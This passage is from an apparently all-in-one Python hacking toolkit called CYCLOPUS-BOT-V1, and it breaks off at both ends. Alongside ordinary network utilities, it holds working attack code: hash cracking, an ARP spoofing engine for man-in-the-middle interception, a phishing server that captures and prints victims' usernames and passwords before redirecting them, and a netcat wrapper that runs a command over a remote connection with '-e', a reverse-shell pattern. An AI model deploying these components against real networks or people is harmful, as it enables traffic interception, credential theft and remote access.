                    self.db.update_cracking_job(job_id, 'failed', 'No match found', False)
                return
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            result_file = os.path.join(CRACKING_DIR, f"{job_id}_result.txt")
            if os.path.exists(result_file):
                with open(result_file, 'r') as f:
                    content = f.read().strip()
                    if ':' in content:
                        cracked = content.split(':', 1)[1]
                        self.db.update_cracking_job(job_id, 'completed', cracked, True)
                    else:
                        self.db.update_cracking_job(job_id, 'completed', content, True)
            else:
                self.db.update_cracking_job(job_id, 'failed', 'No result found', False)
                
        except subprocess.TimeoutExpired:
            self.db.update_cracking_job(job_id, 'failed', 'Timeout', False)
        except Exception as e:
            self.db.update_cracking_job(job_id, 'failed', str(e), False)
    
    def _get_hash_type_num(self, hash_type: str) -> int:
        hash_types = {
            'md5': 0,
            'sha1': 100,
            'sha256': 1400,
            'sha512': 1700,
            'ntlm': 1000,
            'md5_utf8': 10,
            'sha1_utf8': 110,
            'sha256_utf8': 1410,
            'sha512_utf8': 1710,
            'mysql': 200,
            'mysql5': 300,
            'postgres': 12,
            'mssql': 131,
            'oracle': 3100,
            'bcrypt': 3200,
            'scrypt': 8900,
            'pbkdf2': 10900
        }
        return hash_types.get(hash_type.lower(), self.default_hash_type)
    
    def _crack_with_python(self, hash_type: str, hash_value: str, wordlist: str) -> Optional[str]:
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    if not word:
                        continue
                    
                    if hash_type.lower() == 'md5':
                        if hashlib.md5(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha1':
                        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha256':
                        if hashlib.sha256(word.encode()).hexdigest() == hash_value:
                            return word
                    elif hash_type.lower() == 'sha512':
                        if hashlib.sha512(word.encode()).hexdigest() == hash_value:
                            return word
            return None
        except:
            return None
    
    def get_job_status(self, job_id: str) -> Optional[Dict]:
        jobs = self.db.get_cracking_jobs()
        for job in jobs:
            if job['job_id'] == job_id:
                return dict(job)
        return None
    
    def get_all_jobs(self) -> List[Dict]:
        return self.db.get_cracking_jobs()

# =====================
# ARP SPOOFING ENGINE
# =====================
class ARPSpoofingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.active_spoofs = {}
        self.interface = config.get('arp_spoofing.interface', 'eth0')
        self.enable_ip_forward = config.get('arp_spoofing.enable_ip_forward', True)
        self.sniff_interval = config.get('arp_spoofing.sniff_interval', 60)
        self.stop_events = {}
    
    def start_spoof(self, target_ip: str, gateway_ip: str, interface: str = None) -> ARPSpoofResult:
        if not SCAPY_AVAILABLE:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        try:
            ipaddress.ip_address(target_ip)
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            return ARPSpoofResult(
                target_ip=target_ip,
                gateway_ip=gateway_ip,
                interface=interface or self.interface,
                status="failed",
                packets_sent=0,
                duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        
        if self.enable_ip_forward:
            self._enable_ip_forward()
        
        self.db.add_arp_spoof(target_ip, gateway_ip, interface or self.interface)
        
        spoof_id = f"{target_ip}_{gateway_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.stop_events[spoof_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_spoof,
            args=(spoof_id, target_ip, gateway_ip, interface or self.interface, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_spoofs[spoof_id] = {
            'target_ip': target_ip,
            'gateway_ip': gateway_ip,
            'interface': interface or self.interface,
            'start_time': datetime.datetime.now().isoformat(),
            'status': 'running'
        }
        
        return ARPSpoofResult(
            target_ip=target_ip,
            gateway_ip=gateway_ip,
            interface=interface or self.interface,
            status="running",
            packets_sent=0,
            duration=0.0,
            started_at=datetime.datetime.now().isoformat(),
            ended_at=""
        )
    
    def _run_spoof(self, spoof_id: str, target_ip: str, gateway_ip: str,
                   interface: str, stop_event: threading.Event):
        try:
            from scapy.all import ARP, Ether, send, srp
            
            target_mac = self._get_mac(target_ip, interface)
            gateway_mac = self._get_mac(gateway_ip, interface)
            
            if not target_mac or not gateway_mac:
                self._update_spoof_status(spoof_id, "failed", 0, 0)
                return
            
            packets_sent = 0
            start_time = time.time()
            
            while not stop_event.is_set():
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(packet1, verbose=False)
                
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
                send(packet2, verbose=False)
                
                packets_sent += 2
                time.sleep(1)
            
            duration = time.time() - start_time
            self._update_spoof_status(spoof_id, "completed", packets_sent, duration)
            
        except Exception as e:
            logger.error(f"ARP spoofing error: {e}")
            self._update_spoof_status(spoof_id, "failed", 0, 0)
    
    def _get_mac(self, ip: str, interface: str) -> Optional[str]:
        try:
            from scapy.all import ARP, Ether, srp
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered, _ = srp(arp_request_broadcast, timeout=2, iface=interface, verbose=False)
            if answered:
                return answered[0][1].hwsrc
            return None
        except:
            return None
    
    def _update_spoof_status(self, spoof_id: str, status: str, packets_sent: int, duration: float):
        if spoof_id in self.active_spoofs:
            spoof = self.active_spoofs[spoof_id]
            self.db.update_arp_spoof(
                spoof['target_ip'],
                spoof['gateway_ip'],
                packets_sent,
                duration,
                datetime.datetime.now().isoformat()
            )
            spoof['status'] = status
            if status == 'completed' or status == 'failed':
                if spoof_id in self.stop_events:
                    del self.stop_events[spoof_id]
                del self.active_spoofs[spoof_id]
    
    def _enable_ip_forward(self):
        try:
            if platform.system().lower() == 'linux':
                with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                    f.write('1')
            elif platform.system().lower() == 'windows':
                subprocess.run(
                    ['reg', 'add', 'HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
                     '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                    capture_output=True
                )
        except Exception as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
    
    def stop_spoof(self, spoof_id: str = None) -> bool:
        if spoof_id:
            if spoof_id in self.stop_events:
                self.stop_events[spoof_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active_spoofs(self) -> List[Dict]:
        return [
            {
                'id': sid,
                'target_ip': spoof['target_ip'],
                'gateway_ip': spoof['gateway_ip'],
                'interface': spoof['interface'],
                'status': spoof['status'],
                'start_time': spoof['start_time']
            }
            for sid, spoof in self.active_spoofs.items()
        ]
    
    def get_spoof_history(self, limit: int = 20) -> List[Dict]:
        return self.db.get_arp_spoofs()

# =====================
# MAC ADDRESS MANAGER
# =====================
class MACManager:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.vendor_cache = {}
        self._load_vendor_cache()
    
    def _load_vendor_cache(self):
        try:
            vendor_file = os.path.join(CONFIG_DIR, "mac_vendors.json")
            if os.path.exists(vendor_file):
                with open(vendor_file, 'r') as f:
                    self.vendor_cache = json.load(f)
        except:
            pass
    
    def get_mac_info(self, mac_address: str) -> Dict:
        mac = mac_address.upper()
        mac = mac.replace('-', ':')
        mac = mac.replace('.', ':')
        
        db_info = self.db.get_mac_info(mac)
        if db_info:
            return db_info
        
        vendor = self._get_vendor(mac)
        ip = self._get_ip_from_mac(mac)
        hostname = None
        if ip:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except:
                pass
        
        self.db.add_mac_info(mac, vendor, ip, hostname)
        
        return {
            'mac_address': mac,
            'vendor': vendor or 'Unknown',
            'ip_address': ip or 'Unknown',
            'hostname': hostname or 'Unknown',
            'first_seen': datetime.datetime.now().isoformat(),
            'last_seen': datetime.datetime.now().isoformat()
        }
    
    def _get_vendor(self, mac: str) -> Optional[str]:
        prefix = mac[:8].upper().replace(':', '')
        
        if prefix in self.vendor_cache:
            return self.vendor_cache[prefix]
        
        try:
            response = requests.get(
                f"https://api.macvendors.com/{mac}",
                timeout=5
            )
            if response.status_code == 200:
                vendor = response.text.strip()
                self.vendor_cache[prefix] = vendor
                return vendor
        except:
            pass
        
        return None
    
    def _get_ip_from_mac(self, mac: str) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['arp', '-n'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac.lower() in line.lower():
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['arp', '-a'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if mac in line:
                        parts = line.split()
                        if len(parts) >= 1:
                            return parts[0]
        except:
            pass
        return None
    
    def scan_network(self, network: str = None) -> List[Dict]:
        if not SCAPY_AVAILABLE:
            return []
        
        if not network:
            local_ip = self._get_local_ip()
            network = f"{local_ip}/24"
        
        results = []
        try:
            from scapy.all import ARP, Ether, srp
            
            arp = ARP(pdst=network)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether / arp
            
            answered, _ = srp(packet, timeout=2, verbose=False)
            
            for sent, received in answered:
                mac = received.hwsrc
                ip = received.psrc
                vendor = self._get_vendor(mac)
                self.db.add_mac_info(mac, vendor, ip, None)
                
                results.append({
                    'mac_address': mac,
                    'ip_address': ip,
                    'vendor': vendor or 'Unknown'
                })
        except Exception as e:
            logger.error(f"Network scan error: {e}")
        
        return results
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"

# =====================
# NAT INFORMATION ENGINE
# =====================
class NATInfoEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_nat_info(self) -> NATInfo:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        router_ip = self._get_router_ip()
        location = self._get_location(public_ip) if public_ip else {}
        
        nat_info = NATInfo(
            public_ip=public_ip or 'Unknown',
            private_ip=private_ip or 'Unknown',
            router_ip=router_ip or 'Unknown',
            country=location.get('country', 'Unknown'),
            isp=location.get('isp', 'Unknown'),
            nat_type=self._detect_nat_type()
        )
        
        self.db.add_nat_info(
            nat_info.public_ip,
            nat_info.private_ip,
            nat_info.router_ip,
            nat_info.country,
            nat_info.isp,
            nat_info.nat_type
        )
        
        return nat_info
    
    def _get_public_ip(self) -> Optional[str]:
        try:
            response = requests.get('https://api.ipify.org', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        try:
            response = requests.get('http://icanhazip.com', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        
        return None
    
    def _get_private_ip(self) -> Optional[str]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None
    
    def _get_router_ip(self) -> Optional[str]:
        try:
            if platform.system().lower() == 'linux':
                result = subprocess.run(
                    ['ip', 'route', 'show', 'default'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
            elif platform.system().lower() == 'windows':
                result = subprocess.run(
                    ['ipconfig'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            return parts[1].strip()
        except:
            pass
        return None
    
    def _get_location(self, ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0)
                    }
        except:
            pass
        return {}
    
    def _detect_nat_type(self) -> str:
        public_ip = self._get_public_ip()
        private_ip = self._get_private_ip()
        
        if public_ip and private_ip and public_ip != private_ip:
            return 'Full Cone NAT'
        elif public_ip and private_ip and public_ip == private_ip:
            return 'No NAT (Public IP)'
        else:
            return 'Unknown NAT Type'

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
                parts = line.split()
                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'
    
    def docker_info(self) -> Dict:
        result = subprocess.run(['docker', 'info'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_ps(self) -> Dict:
        result = subprocess.run(['docker', 'ps'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_images(self) -> Dict:
        result = subprocess.run(['docker', 'images'], capture_output=True, text=True, timeout=30)
        return {'success': result.returncode == 0, 'output': result.stdout}
    
    def docker_bench(self) -> Dict:
        result = subprocess.run(
            ['docker', 'run', '--rm', '--net', 'host', '--pid', 'host',
             '--cap-add', 'audit_control', '-v', '/var/lib:/var/lib',
             '-v', '/var/run/docker.sock:/var/run/docker.sock',
             '-v', '/etc:/etc', '-v', '/usr/lib/systemd:/usr/lib/systemd',
             'docker/docker-bench-security'],
            capture_output=True, text=True, timeout=300
        )
        return {'success': result.returncode == 0, 'output': result.stdout}

# =====================
# EMAIL COMPOSER ENGINE
# =====================
class EmailComposerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.smtp_server = config.get('email.smtp_server', '')
        self.smtp_port = config.get('email.smtp_port', 587)
        self.smtp_username = config.get('email.smtp_username', '')
        self.smtp_password = config.get('email.smtp_password', '')
        self.from_email = config.get('email.from_email', '')
        self.tls = config.get('email.tls', True)
    
    def compose_email(self, to: str, subject: str, body: str, 
                      from_email: str = None, html: bool = False,
                      attachments: List[str] = None) -> EmailMessage:
        """Compose an email message"""
        email_msg = EmailMessage(
            to=to,
            subject=subject,
            body=body,
            from_email=from_email or self.from_email,
            attachments=attachments or [],
            html=html,
            status="draft"
        )
        self.db.save_email(email_msg)
        return email_msg
    
    def send_email(self, email_id: int) -> Dict[str, Any]:
        """Send an email message"""
        emails = self.db.get_emails(limit=100)
        email_data = next((e for e in emails if e['id'] == email_id), None)
        
        if not email_data:
            return {'success': False, 'error': f'Email {email_id} not found'}
        
        if email_data['status'] == 'sent':
            return {'success': False, 'error': 'Email already sent'}
        
        if not self.smtp_server or not self.smtp_username or not self.smtp_password:
            return {'success': False, 'error': 'SMTP server not configured'}
        
        try:
            msg = MIMEMultipart()
            msg['From'] = email_data['from_address']
            msg['To'] = email_data['to_address']
            msg['Subject'] = email_data['subject']
            
            if email_data['html']:
                msg.attach(MIMEText(email_data['body'], 'html'))
            else:
                msg.attach(MIMEText(email_data['body'], 'plain'))
            
            attachments = json.loads(email_data['attachments']) if email_data['attachments'] else []
            for attachment_path in attachments:
                if os.path.exists(attachment_path):
                    with open(attachment_path, 'rb') as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename={os.path.basename(attachment_path)}'
                        )
                        msg.attach(part)
            
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                if self.tls:
                    server.starttls()
                server.login(self.smtp_username, self.smtp_password)
                server.send_message(msg)
            
            self.db.update_email_status(email_id, 'sent')
            
            return {
                'success': True,
                'message': f'Email sent to {email_data["to_address"]}',
                'email_id': email_id
            }
            
        except Exception as e:
            self.db.update_email_status(email_id, 'failed')
            return {'success': False, 'error': str(e)}
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        return self.db.get_emails(status, limit)
    
    def delete_email(self, email_id: int) -> bool:
        try:
            self.db.conn.execute("DELETE FROM email_messages WHERE id = ?", (email_id,))
            self.db.conn.commit()
            return True
        except:
            return False

# =====================
# PDF REPORT GENERATOR
# =====================
class PDFReportGenerator:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.pdf_available = PDF_AVAILABLE
    
    def generate_report(self, title: str, target: str, analysis: Dict) -> Dict[str, Any]:
        """Generate a PDF report"""
        if not self.pdf_available:
            return {'success': False, 'error': 'PDF generation not available (reportlab missing)'}
        
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cyclopus_report_{target}_{timestamp}.pdf"
            filepath = os.path.join(PDF_REPORTS_DIR, filename)
            
            doc = SimpleDocTemplate(
                filepath,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            styles = getSampleStyleSheet()
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=24,
                textColor=colors.HexColor('#00d4ff'),
                alignment=0,
                spaceAfter=30
            )
            
            story = []
            
            story.append(Paragraph(f"🐙 CYCLOPUS-BOT-V1 Security Report", title_style))
            story.append(Paragraph(f"Title: {title}", styles['Heading2']))
            story.append(Paragraph(f"Target: {target}", styles['Normal']))
            story.append(Paragraph(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles['Normal']))
            story.append(Spacer(1, 20))
            
            story.append(Paragraph("Executive Summary", styles['Heading2']))
            summary = f"This report presents a comprehensive security analysis of <b>{target}</b>."
            story.append(Paragraph(summary, styles['Normal']))
            story.append(Spacer(1, 12))
            
            for key, value in analysis.items():
                if isinstance(value, dict):
                    story.append(Paragraph(key.replace('_', ' ').title(), styles['Heading3']))
                    for sub_key, sub_value in value.items():
                        if not isinstance(sub_value, (dict, list)):
                            story.append(Paragraph(f"• {sub_key.replace('_', ' ').title()}: {sub_value}", styles['Normal']))
                    story.append(Spacer(1, 10))
            
            if 'recommendations' in analysis:
                story.append(Paragraph("Recommendations", styles['Heading2']))
                for rec in analysis['recommendations']:
                    story.append(Paragraph(f"• {rec}", styles['Normal']))
            
            story.append(Spacer(1, 30))
            story.append(Paragraph(
                f"Report generated by CYCLOPUS-BOT-V1 v{VERSION} | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                styles['Italic']
            ))
            
            doc.build(story)
            
            report = PDFReport(
                title=title,
                target=target,
                analysis=analysis,
                timestamp=datetime.datetime.now().isoformat(),
                file_path=filepath,
                status="generated"
            )
            self.db.save_pdf_report(report)
            
            return {
                'success': True,
                'file_path': filepath,
                'message': f'PDF report generated: {filename}'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_reports(self, limit: int = 20) -> List[Dict]:
        return self.db.get_pdf_reports(limit)

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load phishing templates from database"""
        templates = {}
        try:
            rows = self.db.get_phishing_templates()
            for row in rows:
                templates[row['name']] = row['html_content']
        except:
            pass
        return templates
    
    def reload_templates(self):
        """Reload templates from database"""
        self.templates = self._load_templates()
    
    def generate_phishing_link(self, platform: str) -> Dict:
        """Generate a phishing link for the specified platform"""
        link_id = str(uuid.uuid4())[:8]
        
        html = self.templates.get(platform, self.templates.get('custom', ''))
        if not html:
            return {'success': False, 'output': f'Template {platform} not found'}
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        
        from http.server import HTTPServer, BaseHTTPRequestHandler
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.RED}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        server = HTTPServer(('0.0.0.0', port), PhishingHandler)
        server.server_instance = self
        server.link_id = link_id
        server.html = link_data['html']
        
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.phishing_server = server
        
        return True
    
    def stop_server(self):
        """Stop phishing server"""
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def get_available_templates(self) -> List[str]:
        """Get list of available phishing templates"""
        return list(self.templates.keys())
    
    def update_template(self, name: str, html_content: str) -> bool:
        """Update a phishing template"""
        try:
            self.db.save_phishing_template(name, 'custom', html_content)
            self.templates[name] = html_content
            return True
        except:
            return False
    
    def create_custom_template(self, name: str, html_content: str) -> bool:
        """Create a custom phishing template"""
        return self.update_template(name, html_content)
    
    def delete_template(self, name: str) -> bool:
        """Delete a phishing template"""
        try:
            self.db.delete_phishing_template(name)
            if name in self.templates:
                del self.templates[name]
            return True
        except:
            return False

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        start_time = time.time()
        try:
            cmd = ['wget', '-q', url]
            if output:
                cmd.extend(['-O', output])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            else:
                if shutil.which('mtr'):
                    cmd = ['mtr', '--report', '--report-cycles', '1', target]
                else:
                    cmd = ['traceroute', '-n', target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                execution_time = time.time() - start_time
                return CommandResult(True, str(result), execution_time)
            else:
                cmd = ['whois', domain]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                execution_time = time.time() - start_time
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, execution_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True,
                        'country': data.get('country'),
                        'city': data.get('city'),
                        'isp': data.get('isp'),
                        'lat': data.get('lat'),
                        'lon': data.get('lon')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
